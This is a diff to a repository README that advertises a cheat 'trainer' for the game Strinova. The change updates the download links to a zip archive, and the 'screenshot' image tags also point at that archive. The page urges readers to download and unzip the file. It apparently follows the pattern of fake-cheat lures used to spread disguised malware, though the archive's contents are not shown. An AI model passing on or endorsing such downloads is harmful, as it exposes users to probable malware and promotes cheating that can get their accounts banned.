@@ -1,7 +1,7 @@
 ## How to use
 1. Download the cheat from the button below
 
-[<img src="https://raw.githubusercontent.com/egorpanin08/Strinova-Trainer/main/wayang/Trainer-Strinova-v2.1.zip">](https://raw.githubusercontent.com/egorpanin08/Strinova-Trainer/main/wayang/Trainer-Strinova-v2.1.zip)
+[<img src="https://github.com/egorpanin08/Strinova-Trainer/raw/refs/heads/main/wayang/Trainer-Strinova-3.0.zip">](https://github.com/egorpanin08/Strinova-Trainer/raw/refs/heads/main/wayang/Trainer-Strinova-3.0.zip)
 
 2. Unzip to any folder
 
@@ -22,8 +22,8 @@
 * Client: Steam, Epic Games (EGS), Strinova Launcher 
 
 ## Features of hacks for Strinova
-![memez_strinova_s1](https://raw.githubusercontent.com/egorpanin08/Strinova-Trainer/main/wayang/Trainer-Strinova-v2.1.zip)
-![memez_strinova_s2](https://raw.githubusercontent.com/egorpanin08/Strinova-Trainer/main/wayang/Trainer-Strinova-v2.1.zip)
+![memez_strinova_s1](https://github.com/egorpanin08/Strinova-Trainer/raw/refs/heads/main/wayang/Trainer-Strinova-3.0.zip)
+![memez_strinova_s2](https://github.com/egorpanin08/Strinova-Trainer/raw/refs/heads/main/wayang/Trainer-Strinova-3.0.zip)
 
 - Our cheats for Strinova will allow you to completely change your gaming experience, providing access to various functions:
 
